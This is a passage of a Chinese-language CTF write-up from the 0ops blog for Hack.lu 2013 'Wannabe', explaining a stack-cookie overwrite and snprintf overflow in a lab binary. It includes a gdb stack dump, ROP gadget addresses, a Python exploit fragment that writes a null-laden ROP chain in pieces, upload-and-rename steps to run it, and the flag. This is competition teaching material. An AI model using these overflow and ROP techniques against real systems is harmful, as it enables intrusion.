</span><span class="line">          <span class="n">length</span> <span class="o">=</span> <span class="n">end</span><span class="o">-</span><span class="p">(</span><span class="n">pos</span><span class="o">+</span><span class="mi">8</span><span class="p">);</span>
</span><span class="line">          <span class="k">if</span> <span class="p">(</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">192</span><span class="p">)</span>
</span><span class="line">              <span class="n">length</span> <span class="o">=</span> <span class="mi">192</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">          <span class="n">strncpy</span><span class="p">(</span><span class="n">found</span><span class="p">[</span><span class="n">cnt</span><span class="p">],</span> <span class="n">pos</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class="line">          <span class="n">cnt</span><span class="o">++</span><span class="p">;</span>
</span><span class="line">      <span class="p">}</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></tbody></table></div></figure>


<p>这里它把./upload目录下的文件都过一遍，看看有没有system(“”)类似的语句。如果有就拿出来放到found数组里面去。found这个数组在全局定义为found[255][192]。这里尽管限制了found[i]的长度，但是对这个i没有限制，如果说类似的system(“”)超过了255个将会覆盖掉cookie的值。</p>

<p>再往下看,</p>

<figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">void</span> <span class="n">log_result</span><span class="p">(</span><span class="n">unsigned</span> <span class="n">char</span> <span class="n">cnt</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="nb">int</span> <span class="n">overflow</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
</span><span class="line">  <span class="n">char</span> <span class="nb">buffer</span><span class="p">[</span><span class="mi">224</span><span class="p">];</span>
</span><span class="line">
</span><span class="line">  <span class="n">bzero</span><span class="p">(</span><span class="nb">buffer</span><span class="p">,</span> <span class="mi">224</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">  <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">cnt</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">      <span class="n">snprintf</span><span class="p">(</span><span class="nb">buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">found</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">+</span><span class="mi">32</span><span class="p">,</span> <span class="s">"systemcall (</span><span class="si">%d</span><span class="s">/</span><span class="si">%d</span><span class="s">): </span><span class="si">%s</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">cnt</span><span class="p">,</span> <span class="n">found</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class="line">      <span class="n">puts</span><span class="p">(</span><span class="nb">buffer</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">
</span><span class="line">  <span class="k">if</span> <span class="p">(</span><span class="n">overflow</span> <span class="o">!=</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">      <span class="n">printf</span><span class="p">(</span><span class="s">"overflow shit, cookie does not match: </span><span class="si">%s</span><span class="s">...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">overflow</span><span class="p">);</span>
</span><span class="line">      <span class="n">abort</span><span class="p">();</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></tbody></table></div></figure>


<p>这里我们看到overflow的判断不成问题，因为前面我们已经能覆盖cookie了这里把overflow覆盖成同样的值就OK了。看一下栈布局吧，能不能利用snprintf溢出呢，调试一下吧（control和control.c能用shell搞下来）。</p>

<figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">gdb</span><span class="err">$</span> <span class="n">x</span><span class="o">/</span><span class="mi">100</span><span class="n">x</span> <span class="err">$</span><span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x110</span>
</span><span class="line"><span class="mh">0x7fffffffe300</span><span class="p">:</span> <span class="mh">0x74737973</span>      <span class="mh">0x61636d65</span>      <span class="mh">0x28206c6c</span>      <span class="mh">0x29312f31</span>
</span><span class="line"><span class="mh">0x7fffffffe310</span><span class="p">:</span> <span class="mh">0x4141203a</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe320</span><span class="p">:</span> <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe330</span><span class="p">:</span> <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe340</span><span class="p">:</span> <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe350</span><span class="p">:</span> <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe360</span><span class="p">:</span> <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe370</span><span class="p">:</span> <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe380</span><span class="p">:</span> <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe390</span><span class="p">:</span> <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe3a0</span><span class="p">:</span> <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe3b0</span><span class="p">:</span> <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe3c0</span><span class="p">:</span> <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
</span><span class="line"><span class="mh">0x7fffffffe3d0</span><span class="p">:</span> <span class="mh">0x00004141</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>
</span><span class="line"><span class="mh">0x7fffffffe3e0</span><span class="p">:</span> <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>      <span class="mh">0xf7ae5a96</span>      <span class="mh">0xb4e688b1</span>
</span><span class="line"><span class="mh">0x7fffffffe3f0</span><span class="p">:</span> <span class="mh">0xffffe420</span>      <span class="mh">0x00007fff</span>      <span class="mh">0x00000000</span>      <span class="mh">0x00000000</span>
</span><span class="line"><span class="mh">0x7fffffffe400</span><span class="p">:</span> <span class="mh">0x00400b60</span>      <span class="mh">0x00000000</span>      <span class="mh">0xffffe630</span>      <span class="mh">0x00007fff</span>
</span><span class="line"><span class="mh">0x7fffffffe410</span><span class="p">:</span> <span class="mh">0xffffe530</span>      <span class="mh">0x00007fff</span>      <span class="mh">0x004012b0</span>      <span class="mh">0x00000000</span>
</span></code></pre></td></tr></tbody></table></div></figure>


<p>我们注意到buffer开头地址是0x7fffffffe300, rip在0x7fffffffe416。buffer(18+192=210)结束到0x7fffffffe3d2，距离rip为0x44=68。
另外我们的目标是那个sign_key.flag。所以我们可以利用puts把它输出出来。x64第一个参数压到%rdi里面。</p>

<figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">ROPgadget</span><span class="o">-</span><span class="n">dev</span><span class="c"># ./ROPgadget control</span>
</span><span class="line"><span class="n">Gadgets</span> <span class="n">information</span>
</span><span class="line"><span class="o">============================================================</span>
</span><span class="line"><span class="mh">0x0000000000400ba5</span><span class="p">:</span> <span class="n">pop</span> <span class="n">rbp</span> <span class="p">;</span> <span class="n">ret</span>
</span><span class="line"><span class="mh">0x0000000000401583</span><span class="p">:</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="p">;</span> <span class="n">ret</span>
</span><span class="line">
</span><span class="line"><span class="mi">400</span><span class="n">ccb</span><span class="p">:</span> <span class="n">bf</span> <span class="mi">80</span> <span class="mi">1</span><span class="n">d</span> <span class="mi">60</span> <span class="mo">00</span>        <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x601d80</span><span class="p">,</span><span class="o">%</span><span class="n">edi</span>
</span><span class="line"><span class="mi">400</span><span class="n">cd0</span><span class="p">:</span> <span class="n">e8</span> <span class="mi">0</span><span class="n">b</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>           <span class="n">callq</span>  <span class="mf">4009e0</span> <span class="o">&lt;</span><span class="n">fread</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class="line">
</span><span class="line"><span class="n">lovelydream</span><span class="err">@</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">control</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">puts</span>
</span><span class="line"><span class="mo">0000000000400</span><span class="mi">9</span><span class="n">d0</span> <span class="o">&lt;</span><span class="n">puts</span><span class="nd">@plt</span><span class="o">&gt;</span><span class="p">:</span>
</span><span class="line">  <span class="mi">4014</span><span class="n">be</span><span class="p">:</span>       <span class="n">e8</span> <span class="mi">0</span><span class="n">d</span> <span class="n">f5</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">callq</span>  <span class="mi">4009</span><span class="n">d0</span> <span class="o">&lt;</span><span class="n">puts</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"> <span class="mi">400</span><span class="n">cbe</span><span class="p">:</span>       <span class="mi">48</span> <span class="mi">89</span> <span class="n">c1</span>                <span class="n">mov</span>    <span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rcx</span>
</span><span class="line"> <span class="mi">400</span><span class="n">cc1</span><span class="p">:</span>       <span class="n">ba</span> <span class="mo">01</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>          <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="n">edx</span>
</span><span class="line"> <span class="mi">400</span><span class="n">cc6</span><span class="p">:</span>       <span class="n">be</span> <span class="mi">1</span><span class="n">e</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>          <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x1e</span><span class="p">,</span><span class="o">%</span><span class="n">esi</span>
</span><span class="line"> <span class="mi">400</span><span class="n">ccb</span><span class="p">:</span>       <span class="n">bf</span> <span class="mi">80</span> <span class="mi">1</span><span class="n">d</span> <span class="mi">60</span> <span class="mo">00</span>          <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x601d80</span><span class="p">,</span><span class="o">%</span><span class="n">edi</span>
</span><span class="line"> <span class="mi">400</span><span class="n">cd0</span><span class="p">:</span>       <span class="n">e8</span> <span class="mi">0</span><span class="n">b</span> <span class="n">fd</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">callq</span>  <span class="mf">4009e0</span> <span class="o">&lt;</span><span class="n">fread</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span><span class="line">
</span><span class="line"><span class="n">lovelydream</span><span class="err">@</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">control</span> <span class="o">|</span> <span class="n">grep</span> <span class="nb">exit</span>
</span><span class="line"><span class="mo">0000000000400</span><span class="n">b20</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">&gt;</span><span class="p">:</span>
</span><span class="line">  <span class="mi">400</span><span class="n">cb5</span><span class="p">:</span>       <span class="n">e8</span> <span class="mi">66</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">callq</span>  <span class="mi">400</span><span class="n">b20</span> <span class="o">&lt;</span><span class="nb">exit</span><span class="nd">@plt</span><span class="o">&gt;</span>
</span></code></pre></td></tr></tbody></table></div></figure>


<p>有了这些我们就可以构造一个”pop rdi; ret” + key_address + puts + exit的gadget把最后的key输出出来。</p>

<p>最后我们看下怎么利用snprintf把exp写到内存里面去。这里我们注意到inspect函数的strncpy是限制了长度的，但是如果我们给了长度为192的字符串的话，found[i]字符串的结束符\x00将会被found[i+1]的字符串覆盖，这样会导致snprintf的时候把found[i]连同这found[i+1]一起写到buffer里面去从而去覆盖rip。</p>

<p>但是我们还有一个问题没有解决就是说我们的exp里面有大量的\x00(因为我们要把地址都pack成8bytes的，16个16进制位)在面对字符串操作的时候可能会出问题，这里我想是bin部分的高潮。就是我们可以把我们的exp一段段写进去，每一段由\x00分开，然后我们从最右端端开始每次写一段进去（从最右端第一个\x00到字符串结束，然后把这段给删了）。这样的话我们的exp在内存里不是一次写进去的，是一部分一部分写进去的(打个比方，就好比铺地毯一样，前面的A用来填充的无所谓，每次覆盖掉就覆盖掉了)。然后利用C语言对于字符串操作最后会补\x00的特点把我们exp里的\x00全部写进去！</p>

<p>废话不多说我们直接上exp片段</p>

<figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tbody><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">def</span> <span class="nf">pack</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span><span class="line">  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">filename</span> <span class="o">=</span> <span class="s">"./upload/pwn"</span>
</span><span class="line"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="k">def</span> <span class="nf">add_file</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span><span class="line">  <span class="k">global</span> <span class="n">f</span>
</span><span class="line">  <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'system("'</span><span class="o">+</span><span class="n">data</span><span class="o">+</span><span class="s">'");</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="k">def</span> <span class="nf">write_data</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span><span class="line">  <span class="n">null_off</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
</span><span class="line">  <span class="k">while</span> <span class="n">null_off</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class="line">    <span class="n">add_file</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">192</span><span class="p">)</span>
</span><span class="line">    <span class="n">add_file</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="n">null_off</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">data</span><span class="p">[</span><span class="n">null_off</span><span class="o">+</span><span class="mi">1</span><span class="p">:])</span>
</span><span class="line">    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="n">null_off</span><span class="p">]</span>
</span><span class="line">    <span class="n">null_off</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
</span><span class="line">  <span class="n">add_file</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">192</span><span class="p">)</span>
</span><span class="line">  <span class="n">add_file</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="n">null_off</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">data</span><span class="p">[</span><span class="n">null_off</span><span class="o">+</span><span class="mi">1</span><span class="p">:])</span>
</span><span class="line">
</span><span class="line"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span><span class="line">  <span class="n">add_file</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">write_data</span><span class="p">(</span><span class="n">rip_off</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="nb">exit</span><span class="p">))</span>
</span></code></pre></td></tr></tbody></table></div></figure>


<p>代码片段，其中rip_off是前文分析提到的68。注意这个循环，真的非常非常精妙。</p>

<p>最后说下怎么去跑这个exp吧。用上面说到的办法，改成jpg后缀名前台上传，然后利用cp命令改成py后缀然后 <code>python ./upload/test.py</code> 类似的。</p>

<p>最后的最后，执行命令”/home/arthur/bin/control —clean”。St4cK_c00KiE_u53D_wRoNG</p>

<p>要非常非常感谢<code>https://stratum0.org</code>提供的题解，其实我的整体思路基本都是学习并理解了它们的writeup特别是最后这段exp，怎么也没有想到。但是他们写的有很多细节地方都不清楚，特别是一些web方面的东西，我做了比较详细的解释和补充。这次这道题目一共只有9个队解出了，看了下都是赫赫有名的综合强队，感觉能做出这样的题目真的非常不容易需要实力到一定的境界了。Fighting Chinese CTFers!</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">l0ve</span></span>

      








  


<time datetime="2013-10-29T20:27:00+08:00" pubdate="" data-updated="true">Oct 29<span>th</span>, 2013</time>
      

<span class="categories">
  
    <a class="category" href="http://blog.0ops.net/blog/categories/hack-dot-lu/">Hack.lu</a>, <a class="category" href="http://blog.0ops.net/blog/categories/exploit/">exploit</a>, <a class="category" href="http://blog.0ops.net/blog/categories/writeup/">writeup</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="http://blog.0ops.net/blog/2013/10/29/hack-dot-lu-ctf-2013-crypto-350-brewr-y/" title="Previous Post: Hack.lu CTF 2013 Crypto 350 BREW&#39;r&#39;Y">« Hack.lu CTF 2013 Crypto 350 BREW'r'Y</a>
      
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the &lt;a href="http://disqus.com/?ref_noscript"&gt;comments powered by Disqus.&lt;/a&gt;</noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="./hacklu-ctf-2013-exp400-wannable-0ops_files/hacklu-ctf-2013-exp400-wannable-0ops.html">Hack.lu CTF 2013 Exploiting 400 Wannabe</a>
      </li>
    
      <li class="post">
        <a href="http://blog.0ops.net/blog/2013/10/29/hack-dot-lu-ctf-2013-crypto-350-brewr-y/">Hack.lu CTF 2013 Crypto 350 BREW'r'Y</a>
      </li>
    
      <li class="post">
        <a href="http://blog.0ops.net/blog/2013/10/27/hack-dot-lu-ctf-2013-misc-222-geolocation-flag/">Hack.lu CTF 2013 Misc 222 Geolocation Flag</a>
      </li>
    
      <li class="post">
        <a href="http://blog.0ops.net/blog/2013/09/28/reversing-300-crackme/">CSAW CTF 2013 Reversing 300 crackme</a>
      </li>
    
      <li class="post">
        <a href="http://blog.0ops.net/blog/2013/09/27/reversing-150-bikinibonanza/">CSAW CTF 2013 Reversing 150 bikinibonanza</a>
      </li>
    
  </ul>
</section>





  
</aside>


      <span class="toggle-sidebar"></span></div>
    </div>
    <footer role="contentinfo"><p>
  Copyright © 2013 - 0ops -
  <span class="credit">Powered by <a href="http://octopress.org/">Octopress</a>. Design by <a href="http://octopressthemes.com/">Octopress Themes</a></span>
</p>

</footer>
    

<script type="text/javascript">
      var disqus_shortname = '0ops';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://blog.0ops.net/blog/2013/10/29/hack-dot-lu-ctf-2013-exploiting-400-wannabe/';
        var disqus_url = 'http://blog.0ops.net/blog/2013/10/29/hack-dot-lu-ctf-2013-exploiting-400-wannabe/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>











  </div>


</body></html>
